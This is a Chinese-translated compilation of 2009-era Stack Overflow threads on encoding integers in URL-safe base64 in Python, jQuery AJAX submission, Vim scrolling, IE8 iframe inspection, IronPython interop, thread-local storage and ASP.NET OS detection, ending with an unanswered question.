我想要在 URL 中表示整数的最短方法。例如，可以使用十六进制将 11234 缩短为“2be2”。由于 base64 使用的是 64 字符编码，因此应该可以使用比十六进制更少的字符来表示 base64 中的整数。问题是我无法找出使用 Python 将整数转换为 base64（然后再返回）的最简洁方法。

base64 模块具有处理字节串的方法 - 所以也许一种解决方案是将整数转换为其二进制表示形式作为 Python 字符串......但我也不知道该怎么做。

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2009-02-18T16:00:18.453

这个答案在精神上与 Douglas Leeder 的相似，但有以下变化：

*   它不使用实际的 Base64，因此没有填充字符
*   它不是先将数字转换为字节字符串（以 256 为基数），而是将其直接转换为以 64 为基数的数字，其优点是可以让您使用符号字符表示负数。

    ```
    import string
    ALPHABET = string.ascii_uppercase + string.ascii_lowercase + \
               string.digits + '-_'
    ALPHABET_REVERSE = dict((c, i) for (i, c) in enumerate(ALPHABET))
    BASE = len(ALPHABET)
    SIGN_CHARACTER = '$'

    def num_encode(n):
        if n < 0:
            return SIGN_CHARACTER + num_encode(-n)
        s = []
        while True:
            n, r = divmod(n, BASE)
            s.append(ALPHABET[r])
            if n == 0: break
        return ''.join(reversed(s))

    def num_decode(s):
        if s[0] == SIGN_CHARACTER:
            return -num_decode(s[1:])
        n = 0
        for c in s:
            n = n * BASE + ALPHABET_REVERSE[c]
        return n 
    ```

* * *

```
 >>> num_encode(0)
    'A'
    >>> num_encode(64)
    'BA'
    >>> num_encode(-(64**5-1))
    '$_____' 
```

* * *

一些旁注：

*   您可以（*略微*）通过将 string.digits 放在字母表中的第一位（并使符号字符“-”）来增加 base-64 数字的可读性；我根据 Python 的 urlsafe_b64encode 选择了我所做的顺序。
*   如果您要编码大量负数，则可以通过使用符号位或一个/两个的补码而不是符号字符来提高效率。
*   您应该能够通过更改字母表轻松地将此代码调整为不同的基数，将其限制为仅字母数字字符或添加其他“URL 安全”字符。
*   在大多数情况下，我建议*不要*在 URI 中使用基数 10 以外的表示形式——与 HTTP 的开销相比，它增加了复杂性并使得调试更加困难，而不会显着节省成本——除非你要使用 TinyURL 式的东西。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-08-01T18:08:21.410

所有关于 Base64 的答案都是非常合理的解决方案。但它们在技术上是不正确的。要将整数转换为可能的*最短 URL 安全字符串*，您需要的是 base 66（有[66 个 URL 安全字符](https://www.rfc-editor.org/rfc/rfc3986#section-2.3)）。

该代码如下所示：

```
from io import StringIO
import urllib

BASE66_ALPHABET = u"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz-_.~"
BASE = len(BASE66_ALPHABET)

def hexahexacontadecimal_encode_int(n):
    if n == 0:
        return BASE66_ALPHABET[0].encode('ascii')

    r = StringIO()
    while n:
        n, t = divmod(n, BASE)
        r.write(BASE66_ALPHABET[t])
    return r.getvalue().encode('ascii')[::-1] 
```

这是这样一个方案的完整实现，可以作为 pip 可安装包使用：

[https://github.com/aljungberg/hhc](https://github.com/aljungberg/hhc)

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2009-02-18T16:40:37.543

您可能不想要真正的 base64 编码 - 它会添加填充等，甚至可能导致比十六进制更大的字符串。如果不需要与其他任何东西互操作，只需使用您自己的编码。例如。这是一个将编码为任何基数的函数（请注意，数字实际上首先存储为最低有效位，以避免额外的 reverse() 调用：

```
def make_encoder(baseString):
    size = len(baseString)
    d = dict((ch, i) for (i, ch) in enumerate(baseString)) # Map from char -> value
    if len(d) != size:
        raise Exception("Duplicate characters in encoding string")

    def encode(x):
        if x==0: return baseString[0]  # Only needed if don't want '' for 0
        l=[]
        while x>0:
            l.append(baseString[x % size])
            x //= size
        return ''.join(l)

    def decode(s):
        return sum(d[ch] * size**i for (i,ch) in enumerate(s))

    return encode, decode

# Base 64 version:
encode,decode = make_encoder("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")

assert decode(encode(435346456456)) == 435346456456 
```

这样做的好处是您可以使用您想要的任何基础，只需将适当的字符添加到编码器的基础字符串中即可。

请注意，较大基数的收益不会那么大。base 64 只会将大小减少到 base 16 的 2/3（6 位/字符而不是 4）。每次加倍只会为每个字符增加一位。除非你真的需要压缩东西，否则只使用十六进制可能是最简单和最快的选择。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2009-02-18T16:22:44.343

编码`n`：

```
data = ''
while n > 0:
    data = chr(n & 255) + data
    n = n >> 8
encoded = base64.urlsafe_b64encode(data).rstrip('=') 
```

解码`s`：

```
data = base64.urlsafe_b64decode(s + '===')
decoded = 0
while len(data) > 0:
    decoded = (decoded << 8) | ord(data[0])
    data = data[1:] 
```

与其他一些“最佳”编码的精神相同，您可以根据 RFC 1738 使用**73**个字符（如果您将“+”视为可用，则实际上是 74 个字符）：

```
alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_`\"!$'()*,-."
encoded = ''
while n > 0:
    n, r = divmod(n, len(alphabet))
    encoded = alphabet[r] + encoded 
```

和解码：

```
decoded = 0
while len(s) > 0:
    decoded = decoded * len(alphabet) + alphabet.find(s[0])
    s = s[1:] 
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2009-02-18T15:48:31.570

您不想要 base64 编码，您想以数字基数 X 表示以 10 为基数的数字。

如果您希望以 26 个字母表示以 10 为基数的数字，您可以使用： [http](http://en.wikipedia.org/wiki/Hexavigesimal) ://en.wikipedia.org/wiki/Hexavigesimal 。（您可以通过使用所有合法的 url 字符来扩展该示例以获得更大的基础）

你至少应该能够得到基数 38（26 个字母，10 个数字，+，_）

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2009-02-18T15:48:31.897

简单的一点是将字节字符串转换为网络安全的 base64：

```
import base64
output = base64.urlsafe_b64encode(s) 
```

棘手的一点是第一步 - 将整数转换为字节字符串。

如果你的整数很小，你最好对它们进行十六进制编码 - 见[saua](https://stackoverflow.com/questions/561486/how-do-you-base64-encode-an-integer-in-python/561534#561534)

否则（hacky递归版本）：

```
def convertIntToByteString(i):
    if i == 0:
        return ""
    else:
        return convertIntToByteString(i >> 8) + chr(i & 255) 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2009-02-18T15:33:18.453

Base64 需要 4 个字节/字符来编码 3 个字节，并且只能编码 3 个字节的倍数（否则会添加填充）。

所以在 Base64 中表示 4 个字节（你的平均 int）需要 8 个字节。用十六进制编码相同的 4 个字节也需要 8 个字节。因此，您不会为单个 int 获得任何收益。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2009-02-18T16:19:56.097

有点hacky，但它有效：

```
def b64num(num_to_encode):
  h = hex(num_to_encode)[2:]     # hex(n) returns 0xhh, strip off the 0x
  h = len(h) & 1 and '0'+h or h  # if odd number of digits, prepend '0' which hex codec requires
  return h.decode('hex').encode('base64') 
```

您可以用 base64 模块中的某些内容替换对 .encode('base64') 的调用，例如 urlsafe_b64encode()

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2011-07-06T20:08:32.487

我维护了一个名为 zbase62 的小库：http: [//pypi.python.org/pypi/zbase62](http://pypi.python.org/pypi/zbase62)

有了它，您可以将 Python 2 str 对象转换为 base-62 编码字符串，反之亦然：

```
Python 2.7.1+ (r271:86832, Apr 11 2011, 18:13:53) 
[GCC 4.5.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> d = os.urandom(32)
>>> d
'C$\x8f\xf9\x92NV\x97\x13H\xc7F\x0c\x0f\x8d9}\xf5.u\xeeOr\xc2V\x92f\x1b=:\xc3\xbc'
>>> from zbase62 import zbase62
>>> encoded = zbase62.b2a(d)
>>> encoded
'Fv8kTvGhIrJvqQ2oTojUGlaVIxFE1b6BCLpH8JfYNRs'
>>> zbase62.a2b(encoded)
'C$\x8f\xf9\x92NV\x97\x13H\xc7F\x0c\x0f\x8d9}\xf5.u\xeeOr\xc2V\x92f\x1b=:\xc3\xbc' 
```

但是，您仍然需要将整数转换为 str。这是 Python 3 内置的：

```
Python 3.2 (r32:88445, Mar 25 2011, 19:56:22)
[GCC 4.5.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> d = os.urandom(32)
>>> d
b'\xe4\x0b\x94|\xb6o\x08\xe9oR\x1f\xaa\xa8\xe8qS3\x86\x82\t\x15\xf2"\x1dL%?\xda\xcc3\xe3\xba'
>>> int.from_bytes(d, 'big')
103147789615402524662804907510279354159900773934860106838120923694590497907642
>>> x= _ 
>>> x.to_bytes(32, 'big')
b'\xe4\x0b\x94|\xb6o\x08\xe9oR\x1f\xaa\xa8\xe8qS3\x86\x82\t\x15\xf2"\x1dL%?\xda\xcc3\xe3\xba' 
```

要在 Python 2 中从 int 转换为字节，反之亦然，据我所知，没有一种方便的标准方法。我想也许我应该复制一些实现，比如这个：[https://github.com/warner/foolscap/blob/46e3a041167950fa93e48f65dcf106a576ed110e/foolscap/banana.py#L41](https://github.com/warner/foolscap/blob/46e3a041167950fa93e48f65dcf106a576ed110e/foolscap/banana.py#L41)到 zbase62 为您提供方便。

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-02-18T15:35:18.340

如果您正在寻找一种使用 base64*缩短*整数表示的方法，我认为您需要寻找其他地方。当您使用 base64 对某些内容进行编码时，它不会变短，实际上它会变长。

例如用 base64 编码的 11234 将产生 MTEyMzQ=

使用 base64 时，您忽略了一个事实，即您不只是将数字 (0-9) 转换为 64 字符编码。您将 3 个字节转换为 4 个字节，因此可以保证您的 base64 编码字符串会长 33.33%。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2011-08-10T13:23:09.913

我需要一个有符号整数，所以我最终选择了：

```
import struct, base64

def b64encode_integer(i):
   return base64.urlsafe_b64encode(struct.pack('i', i)).rstrip('=\n') 
```

例子：

```
>>> b64encode_integer(1)
'AQAAAA'
>>> b64encode_integer(-1)
'_____w'
>>> b64encode_integer(256)
'AAEAAA' 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2015-05-27T10:37:39.643

我正在为此制作一个 pip 包。

我建议你使用我的 bases.py [https://github.com/kamijotouma/bases.py](https://github.com/kamijoutouma/bases.py)，它的灵感来自 bases.js

```
from bases import Bases
bases = Bases()

bases.toBase16(200)                // => 'c8'
bases.toBase(200, 16)              // => 'c8'
bases.toBase62(99999)              // => 'q0T'
bases.toBase(200, 62)              // => 'q0T'
bases.toAlphabet(300, 'aAbBcC')    // => 'Abba'

bases.fromBase16('c8')               // => 200
bases.fromBase('c8', 16)             // => 200
bases.fromBase62('q0T')              // => 99999
bases.fromBase('q0T', 62)            // => 99999
bases.fromAlphabet('Abba', 'aAbBcC') // => 300 
```

请参阅[https://github.com/kamijotouma/bases.py#known-basesalphabets](https://github.com/kamijoutouma/bases.py#known-basesalphabets) 了解可用的碱基

对于您的情况

我建议您使用基数 32、58 或 64

Base-64 警告：除了有几个不同的标准外，当前没有添加填充，也没有跟踪行长。不建议与需要正式 base-64 字符串的 API 一起使用！

base 66 也是如此，目前 bases.js 和 bases.py 都不支持，但[将来可能会](https://github.com/aseemk/bases.js/issues/7)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2009-02-18T15:27:18.580

我会使用你建议的“将整数编码为二进制字符串，然后使用 base64 编码”方法，我会使用 struct：

```
>>> import struct, base64
>>> base64.b64encode(struct.pack('l', 47))
'LwAAAA=='
>>> struct.unpack('l', base64.b64decode(_))
(47,) 
```

再次编辑：要去除因太小而需要完整 32 位精度的数字上的额外 0，请尝试以下操作：

```
def pad(str, l=4):
    while len(str) < l:
        str = '\x00' + str
    return str

>>> base64.b64encode(struct.pack('!l', 47).replace('\x00', ''))
'Lw=='
>>> struct.unpack('!l', pad(base64.b64decode('Lw==')))
(47,) 
```

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2015-08-06T02:14:30.443

*纯 python，没有依赖关系，没有字节字符串的编码等，只需使用正确的 RFC 4648 字符将 base 10 int 转换为 base 64 int：*

```
def tetrasexagesimal(number):
    out=""
    while number>=0:
        if number == 0:
            out = 'A' + out
            break
        digit = number % 64
        out = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[digit] + out
        number /= 64 # //= 64 for py3 (thank spanishgum!)
        if number == 0:
            break
    return out

tetrasexagesimal(1) 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-08-20T22:56:02.017

正如评论中提到的，您可以使用 URL 中未转义的 73 个字符对数据进行编码。我发现有两个地方使用了这种 Base73 URL 编码：

*   [https://git.nolog.cz/NoLog.cz/f.bain/src/branch/master/static/script.js](https://git.nolog.cz/NoLog.cz/f.bain/src/branch/master/static/script.js)基于JS的URL缩短器
*   [https://gist.github.com/LoneFry/3792021](https://gist.github.com/LoneFry/3792021) PHP

但实际上，您可以使用更多字符，如, , ,`/`和`[`其他`]`一些字符。这些字符仅在您执行时转义，即您需要通过 get 参数传递数据。`:``;``encodeURIComponent`

所以实际上您最多可以使用 82 个字符。完整的字母表是`!$&'()*+,-./0123456789:;=@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz~`。我按它们的代码对所有符号进行了排序，因此当 Base82URL 数字被排序为纯字符串时，它们保持相同的顺序。

我在 Chrome 和 Firefox 中进行了测试，它们运行良好，但可能会让普通用户感到困惑。但是我将这些 id 用于没有人看到它们的内部 API 调用。

无符号整数 32 位的最大值可能为 2^32=4294967296 编码为 Base82 后将需要 6 个字符：`$0~]mx`。

我在 Python 中没有代码，但这里有一个 JS 代码，它生成一个随机 id（int32 无符号）并将其编码为 Base82URL：

```
 /**
         * Convert uint32 number to Base82 url safe
         * @param {int} number
         * @returns {string}
         */
        function toBase82Url(number) {
            // all chars that are not escaped in url
            let keys = "!$&'()*+,-./0123456789:;=@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz~"
            let radix = keys.length
            let encoded = []
            do {
                let index = number% radix
                encoded.unshift(keys.charAt(index))
                number = Math.trunc(number / radix)
            } while (number !== 0)
            return encoded .join("")
        }

        function generateToken() {
            let buf = new Uint32Array(1);
            window.crypto.getRandomValues(buf)
            var randomInt = buf[0]
            return toBase82Url(randomInt)
        } 
```

# html - 是否可以使用 jquery/ajax 提交 DIV 元素（非表单）

> ID：561491
> 
> 赞同：0
> 
> 时间：2009-02-18T15:27:01.950
> 
> 标签：html, upload, jquery

是否可以使用 jquery/ajax提交~~FORM DIV 元素（不是表单）？~~我知道你可以使用 jquery.form.js 和 jquery.upload.js。但它们不符合我的要求。

我的*ASCX*控件中有以下 HTML（在我的*ASPX*母版页中已经有一个**FORM**标记）

```
<div id="Div1">
    File: <input type="file" id="fileName"/><br/>
    Tags: <input type="text" id="fileTags"/><br/>
    <input type="submit" value="Submit File"/>
</div> 
```

我的问题是：我只想**提交此 DIV 中的两个元素**（fileName 和 fileTags），而不是整个 ASPX 表单。是否有一个 jquery 脚本/插件可用于将此 DIV 的元素提交到服务器而不刷新页面？例如

```
$("Div1").ajaxSubmit(); 
```

无需重新创建轮子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T15:34:43.070

您可以使用 jQuery 遍历 HTML，并动态创建要提交的对象：

```
var obj = { filename: $('#filename').val(), fileTags: $('#fileTags').val() };
$.post('url.aspx', obj, myCallbackFunction); 
```

这将`obj`作为 POST 发送到您的服务器。您的服务器端代码可以`fileTags`通过`Request.Form["fileTags"]`

**但是**我认为这不适用于文件上传控件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T15:29:46.653

`<input> isn't even valid without a <form>`

# vim - 如何使用 vim 滚动到一个大文件中？

> ID：561500
> 
> 赞同：19
> 
> 时间：2009-02-18T15:27:43.710
> 
> 标签：vim, large-files

我有一个包含数千行数千个字符的大文件。

我将光标移动到第 3000 个字符。

如果我使用`PageDown`or `Ctrl`+ `D`，文件将滚动，但光标将返回到第一个无空格字符。

有一个选项可以设置为在此类滚动后将光标保持在同一列中？

*我在Window*上使用 gvim ，在*OpenVMS*和*Cygwin*上使用vim 。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2009-02-18T15:33:34.023

```
CTRL-E - scroll down
CTRL-Y - scroll up 
```

例如100`<CTRL-E>`将向下滚动 100 行

如果您喜欢使用`PageUp`,`PageDown`或`Ctrl`+`D`等，您可以设置“nostartofline”选项

```
:set nostartofline 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-02-18T15:32:43.307

好吧，一种简单的方法是使用移动键。例如，向下 100 行保持光标在同一列：“100j”

编辑：

好吧，再搜索一点以真正找到您问题的答案，有一个选项可以完全按照您的意愿行事：

```
:set nostartofline 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-05-26T05:36:07.947

## 最近的插件

我正在使用[terryma/vim-smooth-scrolling](https://github.com/terryma/vim-smooth-scroll)插件，因为它提供了非常漂亮和平滑的滚动。

* * *

要**安装**，您可以使用[Vundle](https://github.com/gmarik/vundle)：

```
Bundle terryma/vim-smooth-scrolling 
```

如文档中所述，您可以设置 3 个参数：**距离**、**持续时间**和**速度**。

我在我的**.vimrc**文件中使用它：

```
noremap <silent> <c-b> :call smooth_scroll#up(&scroll*2, 10, 4)<CR>
noremap <silent> <c-f> :call smooth_scroll#down(&scroll*2, 10, 4)<CR> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T15:39:14.180

这可能根本不适合你的情况，但如果它更容易打破线条，你可以在某个字符处打破它们，例如在'：'之后

```
:%s/:/\r&/g 
```

或每 80 个字符

```
:%s/.\{80}/&\r/g 
```

# iframe - 在 IE8 开发人员工具中的 IFrame 中检查？

> ID：561506
> 
> 赞同：6
> 
> 时间：2009-02-18T15:28:27.623
> 
> 标签：iframe, internet-explorer-8

我真的很喜欢在 IE7 中使用[开发者工具栏](http://www.microsoft.com/en-us/download/details.aspx?id=18359)，最近升级到 IE8 以利用（似乎是）功能更全的[开发者工具](http://blogs.msdn.com/ie/archive/2008/03/07/improved-productivity-through-internet-explorer-8-developer-tools.aspx)。

IE8 工具非常出色（最终与 FireBug 相媲美），但我似乎无法检查 iframe 内部，而我可以使用 IE7 工具栏。

我不希望降级到 IE7，因为我喜欢 IE8 工具的其他一些功能，但是在 iframe 内部进行检查的能力是一个交易破坏者。

此外，firebug 对我的实用性有限，因为我们的网站是一个内部部署的 Intranet 应用程序，这意味着“浏览器兼容性”的优先级非常低，主要功能在 FireFox 中经常被破坏。

这是 IE8 工具在 iframe 周围的样子 ![](https://i.stack.imgur.com/MOxok.png)

在 firebug 中，我可以`<html>`在 iframe 下看到一个元素，我可以像页面的其余部分一样展开它

有`<iframe>`问题的`src`属性设置为服务器端（在 ASP.NET 代码隐藏中）

更新：我在这个[Iframe 示例页面](http://www.htmlcodetutorial.com/frames/_IFRAME.html)上得到了相同的结果。如果有人可以使用 IE8 开发人员工具来检查内部，`iframe`那么我想听听。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-07-28T12:56:25.923

安装 IE8 的最终版本，您将轻松浏览任何元素，包括 iFrame 和其他容器控件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:33:20.047

无用的答案：它在这里对我有用。

在里面`<iframe>`我看到`<html>`里面是正常的内容。

（这是Win2k8下的RC1。）

FireBug 是否显示具有任何内容的 iframe？iframe 是动态填充的吗？如果是这样，请尝试在填充 iframe 的点上使用断点进行 JavaScript 调试。

* * *

回答评论中的问题。[来自http://www.htmlcodetutorial.com/frames/_IFRAME.html](http://www.htmlcodetutorial.com/frames/_IFRAME.html)的 iframe ：

*   我在 FireBug 中看到内容文档
*   我在 IE8 中看不到它。

一件事（与此处的内部示例相比）是您指向的 iframe 包含默认内容......但由于 IE8 的开发工具中没有显示，我只能认为这是一个缺陷，应该向 MS 报告。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-19T07:45:03.747

这似乎是 IE8 开发人员工具的错误。从 iframe 引用的文档中删除 <!DOCTYPE 就可以了。

# assemblies - 如何在 IronPython 中创建 .NET 程序集并从 C# 调用它？

> ID：561509
> 
> 赞同：16
> 
> 时间：2009-02-18T15:28:36.283
> 
> 标签：assemblies, ironpython

我想使用 IronPython 创建一个程序集，可以从 C# 调用它。这是我*不*问的两件事。

1.  我不是在问如何从 IronPython 调用 C#。最容易找到的文档描述了如何从 IronPython 内部调用 C#。（例如 IronPython 附带的教程。）我想做相反的事情，从 C# 调用 IronPython。

2.  我不是在问如何嵌入 IronPython 解释器。我找到了一些关于如何从 C# 调用 IronPython 解释器的有用参考资料（例如[这里](http://blogs.microsoft.co.il/blogs/berniea/archive/2008/12/04/extending-your-c-application-with-ironpython.aspx)和[这里）。](http://lists.ironpython.com/pipermail/users-ironpython.com/2005-July/000855.html)这很有帮助，但我对从 IronPython 创建编译程序集更感兴趣。也就是说，我想对 IronPython 程序集进行方法调用，而不是将源代码字符串传递给解释器。

创建程序集后，调用它有哪些技巧？我发现的一篇[博文说：](http://www.sogeti-phoenix.com/Blogs/post/2008/03/Creating-and-Consuming-IronPython-Assemblies.aspx)

> ...从 C# 调用 Python 程序集并非易事。该 python 程序集包含动态类型，这些类型不容易反映到有用的 C# 对象中。

你知道在 IronPython 和 C# 之间传递基本数据类型的任何类型的备忘单吗？

**更新**：我现在最感兴趣的场景是将两个或三个`double`值传递给 Python 并`double`返回一个或两个值。如果我可以传入一个字符串并返回一个字符串，那就太棒了，但我的首要任务只是来回传递数字。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-19T06:10:00.920

如果您的目标是创建一个包含与 C# 创建的类型相似的类型的程序集，那么这实际上是不可能的。这里的主要问题是 Python 类型的工作方式与 CLR 类型有很大不同。一方面，它们可以在运行时发生变异，而 CLR 类型是完全静态的。因此，今天实现这一目标的唯一方法是使用托管接口创建一个小型 C# 存根，将工作委托给 Python 代码。

IronPython 确实具有编译为程序集的能力——这就是博客文章所指的——但我们这样做主要是为了让您可以将 IronPython 应用程序部署给您的客户，而无需向他们提供源代码。

通过对此答案添加评论，随时跟进更具体的场景，我很乐意提供有关如何实施的建议。

# c# - 线程本地存储是否在后台工作程序调用之间持续存在？

> ID：561518
> 
> 赞同：13
> 
> 时间：2009-02-18T15:29:55.530
> 
> 标签：c#, .net, multithreading, backgroundworker, thread-local

后台工作线程是否被重用？

具体来说，如果我在后台工作程序的 DoWork() 方法期间设置了一个命名数据槽（线程本地存储），那么该数据槽的值是否会持续存在，以后可能会在其他线程中找到？

没想到，居然有这个BUG。。。

编辑：[这篇博](http://cs.rthand.com/blogs/blog_with_righthand/archive/2006/05/26/725.aspx)文建议[BackGroundWorker](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)使用[ThreadPool](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx)，这意味着线程*被*重用。所以问题变成了；重复使用的线程是否可能在调用之间保持线程本地存储？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2010-08-05T10:40:57.567

线程池重用线程时，不会清除线程本地存储中的数据，也不会清除带有 ThreadStaticAttribute 属性标记的字段中的数据。因此，通过一种方法放置在线程本地存储中的数据可以暴露给由同一线程池线程执行的任何其他方法。访问标记有 ThreadStaticAttribute 属性的字段的方法可能会遇到不同的数据，具体取决于执行它的线程池线程。

> 来源：http: [//msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx](http://msdn.microsoft.com/en-us/library/system.threading.threadpool.aspx)
> 
> [https://docs.microsoft.com/en-us/dotnet/api/system.threading.threadpool?redirectedfrom=MSDN&view=netframework-4.8#remarks](https://docs.microsoft.com/en-us/dotnet/api/system.threading.threadpool?redirectedfrom=MSDN&view=netframework-4.8#remarks)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-02-18T15:34:53.350

如果未在 MSDN 中指定，则需要检查源（或通过反射器）以确定这一点。

如果未指定，则不能依赖在未来版本的 .NET 中未更改的当前行为。

编辑：看起来它正在使用线程池，所以线程*将*被重用。

# c# - 如何获取操作系统版本 asp.net

> ID：561528
> 
> 赞同：6
> 
> 时间：2009-02-18T15:31:58.537
> 
> 标签：c#, asp.net, windows-mobile

我想获取浏览器打开的操作系统版本，实际上我的项目是一个 asp.net 项目，我想知道客户端上运行的是哪个操作系统，但有一个问题。因为客户端会使用 xp 但同时会使用 Windows CE 5.0，所以 Windows CE 中的 Internet Explorer 不如 xp 中的，因为它我会将用户重定向到我设计的页面视窗 CE。那么有什么解决办法吗？

谢谢..

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T15:37:22.953

使用[`Request.UserAgent`](http://msdn.microsoft.com/en-us/library/system.web.httprequest.useragent.aspx)- 这*可能会*提供您需要的所有信息。

有一个[“用户代理列表”](http://www.user-agents.org/index.shtml?moz)网站提供了许多示例字符串，但是如果您的客户的设置范围有限，那么值得尝试每个设置并记录用户代理作为初步步骤。

请注意，许多浏览器将允许您“欺骗”用户代理字符串，因此您不能出于安全目的使用它 - 但听起来您的用例非常合理。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-18T15:36:28.667

它的要点是 use `Request.Browser.Platform`，版本在`Request.UserAgent`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-08T11:42:35.210

由于选择的答案不是最新的并且提供了一个断开的链接，我决定发布我完成它的方式：

我安装了一个很酷的工具，名为：[https](https://github.com/ua-parser/uap-csharp)
://github.com/ua-parser/uap-csharp ，它将用户代理解析为操作系统、浏览器、浏览器版本等...

[链接到 Nuget](https://www.nuget.org/packages/UAParser/)。

这就是它的使用方式：

```
public static string GetUserBrowser(string userAgent)
        {
            // get a parser with the embedded regex patterns
            var uaParser = Parser.GetDefault();
            ClientInfo c = uaParser.Parse(userAgent);
            return c.UserAgent.Family;
        }

 public static string GetUserOS(string userAgent)
        {
            // get a parser with the embedded regex patterns
            var uaParser = Parser.GetDefault();
            ClientInfo c = uaParser.Parse(userAgent);
            return c.OS.Family;
        } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T15:34:26.657

`USER_AGENT`参数（请求参数中的一个）应该说明问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-01-26T10:36:51.850

我用过这个，它工作得很好。我已经在我的一个应用程序中使用了它。

[http://blogs.microsoft.co.il/blogs/rotemb/archive/2009/01/26/browser-and-operating-system-detection-in-asp-net.aspx](http://blogs.microsoft.co.il/blogs/rotemb/archive/2009/01/26/browser-and-operating-system-detection-in-asp-net.aspx)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-04-02T05:59:37.017

```
OperatingSystem os = Environment.OSVersion;
var platform = os.Platform.ToString();
var version = os.Version.ToString();
var servicePack = os.ServicePack.ToString(); 
```

您还可以在用户代理的帮助下找到。

```
String userAgent = Request.UserAgent;

         if (userAgent.IndexOf("Windows NT 6.3") > 0)
         {
             //Windows 8.1
         }
         else if (userAgent.IndexOf("Windows NT 6.2") > 0)
         {
             //Windows 8
         }
         else if (userAgent.IndexOf("Windows NT 6.1") > 0)
         {
             //Windows 7
         }
         else if (userAgent.IndexOf("Windows NT 6.0") > 0)
         {
             //Windows Vista
         }
         else if (userAgent.IndexOf("Windows NT 5.2") > 0)
         {
             //Windows Server 2003; Windows XP x64 Edition
         }
         else if (userAgent.IndexOf("Windows NT 5.1") > 0)
         {
             //Windows XP
         }
         else if (userAgent.IndexOf("Windows NT 5.01") > 0)
         {
             //Windows 2000, Service Pack 1 (SP1)
         }
         else if (userAgent.IndexOf("Windows NT 5.0") > 0)
         {
             //Windows 2000
         }
         else if (userAgent.IndexOf("Windows NT 4.0") > 0)
         {
             //Microsoft Windows NT 4.0
         }
         else if (userAgent.IndexOf("Win 9x 4.90") > 0)
         {
             //Windows Millennium Edition (Windows Me)
         }
         else if (userAgent.IndexOf("Windows 98") > 0)
         {
             //Windows 98
         }
         else if (userAgent.IndexOf("Windows 95") > 0)
         {
             //Windows 95
         }
         else if (userAgent.IndexOf("Windows CE") > 0)
         {
             //Windows CE
         }
         else
         {
             //Others
         } 
```

# javascript - asp.net mvc RC1中的JavaScriptResult

> ID：561533
> 
> 赞同：2
> 
> 时间：2009-02-18T15:33:16.817
> 
> 标签：javascript, asp.net-mvc

为什么需要[`JavaScriptResult`](http://msdn.microsoft.com/en-us/library/system.web.mvc.javascriptresult.aspx)作为响应？
它不会打破关注点干净分离的模式吗？你能建议我一些有用的情况吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-18T15:55:53.830

JavaScriptResult 的唯一目的是将 ContentType 设置为 application/x-javascript。

如果您有一个将 .JS 文件返回到浏览器的操作，您可能想要使用它。例如，您可以编写一个将所有 JavaScript 文件连接在一起的操作，这样您就可以在一个请求中返回它们而不是多个请求。您可能还想从模板生成 JavaScript。

我看过一些博客文章，我[暗示 JavaScriptResult 将导致返回的文件在当前页面的上下文中执行](http://devlicio.us/blogs/billy_mccafferty/archive/2009/02/07/beware-of-asp-net-mvc-javascriptresult.aspx "http://devlicio.us/blogs/billy_mccafferty/archive/2009/02/07/beware-of-asp-net-mvc-javascriptresult.aspx")。这种印象显然来自发行说明。但是我看不到源代码中实际发生这种情况的任何机制。换句话说，为了获得这种行为，您必须在页面内编写代码导致它发生。简单地使用 JavaScriptResult 不会有这种效果。据我所知，它只是提供一个 js 文件。

# javascript - 如何迭代 sys.net.webrequest (ajax) 的标头

> ID：561539
> 
> 赞同：0
> 
> 时间：2009-02-18T15:33:36.690
> 
> 标签：javascript, ajax

如何遍历`sys.net.webrequest`对象中的标头。文档说它是一本字典，但似乎没有一种简单的方法来遍历字典。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T15:51:22.950

